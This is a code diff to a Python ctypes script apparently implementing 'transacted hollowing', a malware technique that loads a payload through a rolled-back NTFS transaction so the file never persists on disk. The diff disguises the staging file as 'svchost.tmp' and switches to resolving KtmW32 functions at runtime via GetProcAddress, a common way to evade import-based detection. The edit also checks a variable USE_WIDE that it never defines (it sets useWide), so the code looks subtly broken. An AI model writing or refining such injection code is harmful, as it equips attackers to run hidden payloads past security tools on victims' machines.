@@ -83,19 +83,41 @@ CloseHandle=k.CloseHandle
 CloseHandle.argtypes=[wintypes.HANDLE]
 CloseHandle.restype=wintypes.BOOL
 
-# Transaction APIs (using KtmW32.dll)
-ktm=ctypes.windll.ktmw32
-CreateTransaction=ktm.CreateTransaction
-CreateTransaction.argtypes=[wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID]
-CreateTransaction.restype=wintypes.HANDLE
+# Transaction APIs (using KtmW32.dll - load dynamically with GetProcAddress)
+ktm_dll=ctypes.WinDLL("ktmw32.dll")
+GetProcAddress=k.GetProcAddress
+GetProcAddress.argtypes=[wintypes.HMODULE,wintypes.LPCSTR]
+GetProcAddress.restype=wintypes.LPVOID
+GetModuleHandleA=k.GetModuleHandleA
+GetModuleHandleA.argtypes=[wintypes.LPCSTR]
+GetModuleHandleA.restype=wintypes.HMODULE
 
-CreateFileTransactedW=ktm.CreateFileTransactedW
-CreateFileTransactedW.argtypes=[wintypes.LPCWSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID]
-CreateFileTransactedW.restype=wintypes.HANDLE
+# Load functions dynamically
+LoadLibraryA=k.LoadLibraryA
+LoadLibraryA.argtypes=[wintypes.LPCSTR]
+LoadLibraryA.restype=wintypes.HMODULE
+hKtm=LoadLibraryA(b"ktmw32.dll")
+if not hKtm:raise Exception("Cannot load ktmw32.dll")
 
-RollbackTransaction=ktm.RollbackTransaction
-RollbackTransaction.argtypes=[wintypes.HANDLE]
-RollbackTransaction.restype=wintypes.BOOL
+CreateTransactionAddr=GetProcAddress(hKtm,b"CreateTransaction")
+if not CreateTransactionAddr:raise Exception("CreateTransaction not found")
+CreateTransaction=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID)(CreateTransactionAddr)
+
+# Try W version first, fallback to A version
+CreateFileTransactedAddr=GetProcAddress(hKtm,b"CreateFileTransactedW")
+useWide=True
+if not CreateFileTransactedAddr:
+    CreateFileTransactedAddr=GetProcAddress(hKtm,b"CreateFileTransactedA")
+    useWide=False
+if not CreateFileTransactedAddr:raise Exception("CreateFileTransacted not found")
+if useWide:
+    CreateFileTransacted=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPCWSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID)(CreateFileTransactedAddr)
+else:
+    CreateFileTransacted=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPCSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID)(CreateFileTransactedAddr)
+
+RollbackTransactionAddr=GetProcAddress(hKtm,b"RollbackTransaction")
+if not RollbackTransactionAddr:raise Exception("RollbackTransaction not found")
+RollbackTransaction=ctypes.WINFUNCTYPE(wintypes.BOOL,wintypes.HANDLE)(RollbackTransactionAddr)
 
 WriteFile=k.WriteFile
 WriteFile.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.DWORD,ctypes.POINTER(wintypes.DWORD),wintypes.LPVOID]
@@ -107,8 +129,12 @@ def transacted_hollow(payload):
     if hTransaction==-1:return False
     
     # Create transacted file (hidden until commit - we rollback, so it's never on disk)
-    transactedPath="C:\\Windows\\Temp\\svchost.tmp"
-    hTransactedFile=CreateFileTransactedW(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
+    if USE_WIDE:
+        transactedPath="C:\\Windows\\Temp\\svchost.tmp"
+        hTransactedFile=CreateFileTransacted(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
+    else:
+        transactedPath=b"C:\\Windows\\Temp\\svchost.tmp"
+        hTransactedFile=CreateFileTransacted(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
     if hTransactedFile==-1:
         CloseHandle(hTransaction)
         return False
